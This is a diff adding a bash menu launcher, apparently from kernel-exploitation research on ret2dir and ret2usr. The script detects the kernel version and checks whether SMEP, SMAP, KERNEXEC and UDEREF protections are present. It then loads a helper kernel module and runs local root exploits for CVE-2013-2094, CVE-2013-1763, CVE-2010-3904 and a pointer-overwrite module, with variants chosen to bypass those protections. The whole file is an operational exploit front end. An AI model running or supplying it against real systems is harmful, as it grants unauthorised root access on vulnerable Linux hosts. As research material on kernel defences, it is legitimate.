@@ -1,0 +1,308 @@
+#/bin/bash
+
+ipath="`pwd`/include"
+upath="`pwd`/utils"
+rusr_path="`pwd`/ret2usr"
+rdir_path="`pwd`/ret2dir"
+pref_path="/tmp/ret2dir"
+
+do_v380() {
+	case "$kver" in
+	*-pax)
+		echo "  [1] kernwrite"
+		echo "      EDB-ID: NONE"
+		echo "      CVE-ID: NONE (function/data pointer overwrite)"
+	;;
+	*)
+
+		echo "  [1] PERF_EVENTS"
+		echo "      EDB-ID: 26131 (http://www.exploit-db.com/exploits/26131/)"
+		echo "      CVE-ID: 2013-2094 (signedness error)"
+		echo "  [2] kernwrite"
+		echo "      EDB-ID: NONE"
+		echo "      CVE-ID: NONE (function/data pointer overwrite)"
+	;;
+	esac
+	
+		echo "  [0] Exit"
+
+	read -p "> " expl
+
+	case "$kver" in
+	*-pax)
+		if [[ "$expl" == "1" ]]; then
+			expl=2
+		fi
+	;;
+	esac
+
+	case "$expl" in
+	1)
+		echo "Available variants:"
+		echo " $ret2dir[1] ret2dir"
+		echo "      Bypasses: SMEP, SMAP"
+		echo " $ret2usr[2] ret2usr"
+		echo "  [0] Exit"
+		
+		read -p "> " var
+		case "$var" in
+		1)
+			$rdir_path/perf-events_amd64
+		;;
+		2)
+			$rusr_path/perf-events_amd64
+		;;
+		0)
+		;;
+		*)
+			echo "Invalid selection ($var)"
+		;;
+		esac
+	;;
+	2)
+		echo "Available variants:"
+		echo " $ret2dir[1] ret2dir"
+		echo "      Bypasses: SMEP, SMAP, KERNEXEC, UDEREF"
+		echo " $ret2usr[2] ret2usr"
+		echo "  [0] Exit"
+		
+		read -p "> " var
+		case "$var" in
+		1)
+			read -a in -p "<-f/--fptr> or <-d/--dptr> > "
+
+			case "$kver" in
+			*-pax)
+				$rdir_path/kernwrite_amd64-pax $in
+			;;
+			*)
+				$rdir_path/kernwrite_amd64 $in
+			;;
+			esac
+		;;
+		2)
+			read -a in -p "<-f/--fptr> or <-d/--dptr> > "
+
+			$rusr_path/kernwrite_amd64 $in
+		;;
+		0)
+		;;
+		*)
+			echo "Invalid selection ($var)"
+		;;
+		esac
+	;;
+	0)
+	;;
+	*)
+		echo "Invalid selection ($expl)"
+	;;
+	esac
+}
+
+do_v350() {
+	echo "  [1] SOCK_DIAG"
+	echo "      EDB-ID: 24555 (http://www.exploit-db.com/exploits/24555/)"
+	echo "      CVE-ID: 2013-1763 (out-of-bounds read)"
+	echo "  [0] Exit"
+
+	read -p "> " expl
+	case "$expl" in
+	1)
+		echo "Available variants:"
+		echo " $ret2dir[1] ret2dir"
+		echo "      Bypasses: SMEP"
+		echo " $ret2usr[2] ret2usr"
+		echo "  [0] Exit"
+		
+		read -p "> " var
+		case "$var" in
+		1)
+			$rdir_path/sock-diag_amd64
+		;;
+		2)
+			$rusr_path/sock-diag_amd64
+		;;
+		0)
+		;;
+		*)
+			echo "Invalid selection ($var)"
+		;;
+		esac
+	;;
+	0)
+	;;
+	*)
+		echo "Invalid selection ($expl)"
+	;;
+	esac
+}
+
+do_v26336() {
+	echo "  [1] RDS"
+	echo "      EDB-ID: 15285 (http://www.exploit-db.com/exploits/15285/)"
+	echo "      CVE-ID: 2010-3904 (poor argument sanitization)"
+	echo "  [0] Exit"
+
+	read -p "> " expl
+	case "$expl" in
+	1)
+		echo "Available variants:"
+		echo " $ret2dir[1] ret2dir"
+		echo "      Bypasses: KERNEXEC, UDEREF"
+		echo " $ret2usr[2] ret2usr"
+		echo "  [0] Exit"
+		
+		read -p "> " var
+		case "$var" in
+		1)
+			$rdir_path/rds_amd64-pax
+		;;
+		2)
+			$rusr_path/rds_amd64
+		;;
+		0)
+		;;
+		*)
+			echo "Invalid selection ($var)"
+		;;
+		esac
+	;;
+	0)
+	;;
+	*)
+		echo "Invalid selection ($expl)"
+	;;
+	esac
+}
+
+print_elist() {
+	echo 
+	echo "Available exploits:"
+
+	case "$kver" in
+	3.8.0*)
+		case "$kver" in
+		*-pax)
+			$upath/load_kernwrite $upath/kernwrite-pax/kernwrite.ko	
+		;;
+		*)
+			$upath/load_kernwrite $upath/kernwrite/kernwrite.ko	
+		;;
+		esac
+
+		do_v380
+	;;
+	3.5.0*)
+		do_v350
+	;;
+	2.6.33.6*)
+		do_v26336
+	;;
+	esac	
+}
+
+print_sysinfo() {
+	kver=`uname -r`
+	cpu=`cat /proc/cpuinfo | egrep "model name" |	\
+		head -n1 | cut -d":" -f2 | tr -s " " |	\
+		sed "s/^ //g"`
+	ncpu=`cat /proc/cpuinfo | egrep "processor" | wc -l`
+	ram_k=`cat /proc/meminfo | egrep "MemTotal" | tr -s " " | cut -d" " -f2`
+	ram_m=`echo $ram_k/1024 | bc`
+
+	case "$kver" in
+	*-pax)
+		smep="-"
+		smap="-"
+		kernexec="+"
+		uderef="+"
+	;;
+	3.8.0*)
+		dmesg | egrep "command line" | egrep "nosmep" > /dev/null 2>&1
+		
+		if [[ $? -eq 0 ]]; then
+			smep="-"
+		else
+			cat /proc/cpuinfo | egrep "flags" | head -n1 |	\
+					egrep "smep" > /dev/null 2>&1
+
+			if [[ $? -eq 0 ]]; then
+				smep="+"
+			else
+				smep="-"
+			fi
+		fi
+		
+		dmesg | egrep "command line" | egrep "nosmap" > /dev/null 2>&1
+		
+		if [[ $? -eq 0 ]]; then
+			smap="-"
+		else
+			cat /proc/cpuinfo | egrep "flags" | head -n1 |	\
+					egrep "smap" > /dev/null 2>&1
+
+			if [[ $? -eq 0 ]]; then
+				smap="+"
+			else
+				smap="-"
+			fi
+		fi
+
+		kernexec="-"
+		uderef="-"
+	;;
+	3.5.0*)
+		dmesg | egrep "command line" | egrep "nosmep" > /dev/null 2>&1
+		
+		if [[ $? -eq 0 ]]; then
+			smep="-"
+		else
+			cat /proc/cpuinfo | egrep "flags" | head -n1 |	\
+					egrep "smep" > /dev/null 2>&1
+
+			if [[ $? -eq 0 ]]; then
+				smep="+"
+			else
+				smep="-"
+			fi
+		fi
+		
+		smap="-"
+		kernexec="-"
+		uderef="-"
+	;;
+	2.6.33.6)
+		smep="-"
+		smap="-"	
+		kernexec="-"
+		uderef="-"
+	;;
+	esac
+
+	if [[ $smep == "-" && $smap == "-" && 	\
+		$kernexec == "-" && $uderef == "-" ]]; then
+		ret2usr=">"
+		ret2dir=" "
+	else
+		ret2usr=" "
+		ret2dir=">"
+	fi
+	
+	echo -e "Kernel version\t: $kver"
+	echo -e "Prot. (ret2usr)\t: SMEP [$smep] SMAP [$smap]"	\
+		"KERNEXEC [$kernexec] UDEREF [$uderef]"
+	echo -e "CPU\t\t: $cpu (#$ncpu)"
+	echo -e "RAM\t\t: $ram_m MB"
+}
+
+print_banner() {
+	clear
+	cat $ipath/hdr.txt
+	echo
+}
+
+
+print_banner
+print_sysinfo
+print_elist
